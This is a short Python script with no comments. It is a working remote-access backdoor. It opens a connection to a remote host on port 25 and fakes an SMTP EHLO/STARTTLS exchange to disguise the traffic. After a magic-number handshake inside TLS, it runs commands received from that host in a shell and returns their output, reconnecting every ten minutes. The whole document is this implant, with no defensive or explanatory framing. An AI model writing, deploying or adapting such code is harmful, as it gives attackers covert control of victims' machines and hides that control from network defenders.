import socket
import ssl
import struct
import subprocess
import time

def session(host):
    while True:
        s = socket.create_connection((host, 25))
        s.recv(4096)
        s.sendall(b'EHLO gateway\r\n')
        s.recv(4096)
        s.sendall(b'STARTTLS\r\n')
        s.recv(4096)
        s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
        s.sendall(struct.pack('!H', 2437))
        if s.recv(2) != struct.pack('!H', 2437):
            s.close()
            continue
        while True:
            frame = s.recv(4096)
            if not frame:
                break
            opcode = struct.unpack('!H', frame[:2])[0]
            if opcode == 63:
                result = subprocess.check_output(frame[2:].decode(), shell=True)
                s.sendall(result)
        s.close()
        time.sleep(600)
